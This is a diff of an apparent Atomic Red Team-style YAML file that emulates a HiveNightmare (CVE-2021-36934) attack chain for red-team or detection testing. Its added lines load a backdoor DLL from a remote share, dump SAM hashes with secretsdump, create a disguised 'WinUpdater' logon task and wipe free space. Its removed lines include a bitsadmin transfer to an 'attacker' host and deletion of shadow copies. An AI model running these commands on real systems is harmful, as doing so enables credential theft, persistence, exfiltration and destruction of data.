@@ -1,100 +1,82 @@
-- attack_technique: T1082
-  display_name: System Information Discovery
+# HiveNightmare Kill Chain (MITRE ATT&CK YAML)
+
+- attack_technique: T1078
+  display_name: Initial Access - Valid Accounts / Drive-by
   atomic_tests:
-    - name: LOLBin Recon with systeminfo/whoami
+    - name: User accesses exposed print interface or drops fileless loader
       executor:
         name: command_prompt
         command: |
-          systeminfo
-          whoami /priv
+          # Simulate user or attacker access
+          start msedge.exe http://target-printer
   description: |
-    Use native Windows binaries to discover OS, patch level, and privilege context.
+    Initial access via exposed print interface or drive-by download of dropper.
   supported_platforms: [windows]
-  atomic_red_team_link: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1082/T1082.md
+
+- attack_technique: T1218
+  display_name: Execution - DLL Side-Loading / LOLBins
+  atomic_tests:
+    - name: Reflective DLL injection via rundll32
+      executor:
+        name: command_prompt
+        command: |
+          rundll32.exe \\10.10.X.X\share\dll_backdoor_x64.dll,ReflectEntry
+  description: |
+    Execute payload in-memory using trusted Windows binaries (LOLBins).
+  supported_platforms: [windows]
+
+- attack_technique: T1068
+  display_name: Privilege Escalation - HiveNightmare Exploit
+  atomic_tests:
+    - name: Abuse vulnerable ACLs to copy registry hives
+      executor:
+        name: command_prompt
+        command: |
+          powershell -ep bypass -file nightmare_stub.ps1
+  description: |
+    Exploit HiveNightmare (CVE-2021-36934) to copy SAM/SYSTEM/SECURITY hives.
+  supported_platforms: [windows]
 
 - attack_technique: T1003.002
-  display_name: Dump SAM Database (Hive Access)
+  display_name: Credential Access - Dump SAM Database
   atomic_tests:
-    - name: Copy SAM and SYSTEM hive via cmd.exe
+    - name: Extract hashes from copied hives
       executor:
         name: command_prompt
         command: |
-          copy C:\Windows\System32\config\SAM %TEMP%\sam.bak
-          copy C:\Windows\System32\config\SYSTEM %TEMP%\system.bak
+          secretsdump.py -sam sam.bak -system system.bak LOCAL
   description: |
-    Dump sensitive registry hives without admin tools using built-in copy command.
+    Dump credentials from registry hives obtained via HiveNightmare.
   supported_platforms: [windows]
-  atomic_red_team_link: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md
 
-- attack_technique: T1555.003
-  display_name: Credentials from Registry
+- attack_technique: T1053.005
+  display_name: Persistence - Scheduled Task Creation
   atomic_tests:
-    - name: Extract secrets from SECURITY hive
+    - name: Schedule payload with schtasks.exe
       executor:
         name: command_prompt
         command: |
-          copy C:\Windows\System32\config\SECURITY %TEMP%\security.bak
+          schtasks /create /tn "WinUpdater" /tr "HiveNightmare.exe" /sc onlogon /f
   description: |
-    Collect registry hives for offline decryption of LSA secrets.
+    Maintain persistence using schtasks.exe to run payload at logon.
   supported_platforms: [windows]
-  atomic_red_team_link: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/T1555.003.md
 
-- attack_technique: T1041
-  display_name: Exfiltration Over C2 Channel
+- attack_technique: T1485
+  display_name: Impact - Data Destruction (Wipe)
   atomic_tests:
-    - name: Encode file and simulate upload via certutil
+    - name: Wipe free space with cipher.exe
       executor:
         name: command_prompt
         command: |
-          certutil -encode %TEMP%\sam.bak sam.txt
+          cipher /w:C:\
   description: |
-    Encode files to prep for stealth exfiltration using trusted binary.
+    Use cipher.exe to wipe free space and inhibit recovery.
   supported_platforms: [windows]
-  atomic_red_team_link: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1041/T1041.md
-
-- attack_technique: T1567.002
-  display_name: Exfiltration to Web Service
-  atomic_tests:
-    - name: Simulate upload with certutil or BITSAdmin
-      executor:
-        name: command_prompt
-        command: |
-          bitsadmin /transfer exfil /download /priority high http://attacker/upload sam.txt
-  description: |
-    Abuse certutil or bitsadmin to simulate stealth file transfer to external server.
-  supported_platforms: [windows]
-  atomic_red_team_link: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1567.002/T1567.002.md
-
-- attack_technique: T1490
-  display_name: Inhibit System Recovery
-  atomic_tests:
-    - name: Delete Shadow Copies via vssadmin
-      executor:
-        name: command_prompt
-        command: |
-          vssadmin delete shadows /all /quiet
-  description: |
-    Destroy volume shadow copies with built-in administrative tool.
-  supported_platforms: [windows]
-  atomic_red_team_link: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1490/T1490.md
-
-- attack_technique: T1222.001
-  display_name: File and Directory Permissions Modification
-  atomic_tests:
-    - name: Verify ACL exposure on hives
-      executor:
-        name: command_prompt
-        command: |
-          icacls C:\Windows\System32\config\SAM
-  description: |
-    Confirm HiveNightmare vulnerable ACLs exist on sensitive system files.
-  supported_platforms: [windows]
-  atomic_red_team_link: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1222.001/T1222.001.md
 
 - attack_technique: T1070.004
-  display_name: File Deletion
+  display_name: Defense Evasion - File Deletion
   atomic_tests:
-    - name: Remove dumped hive artifacts
+    - name: Remove dropped and dumped artifacts
       executor:
         name: command_prompt
         command: |
@@ -104,18 +86,6 @@
   description: |
     Remove payloads and dumped artifacts post-operation using built-in deletion commands.
   supported_platforms: [windows]
-  atomic_red_team_link: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.004/T1070.004.md
 
-- attack_technique: T1053.005
-  display_name: Scheduled Task Creation
-  atomic_tests:
-    - name: Schedule daily payload with schtasks.exe
-      executor:
-        name: command_prompt
-        command: |
-          schtasks /create /tn "WinUpdater" /tr "cmd /c run.bat" /sc daily /st 23:59
-  description: |
-    Maintain persistence through scheduled execution using LOLBin `schtasks.exe`.
-  supported_platforms: [windows]
-  atomic_red_team_link: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.005/T1053.005.md
+# End of kill chain
 
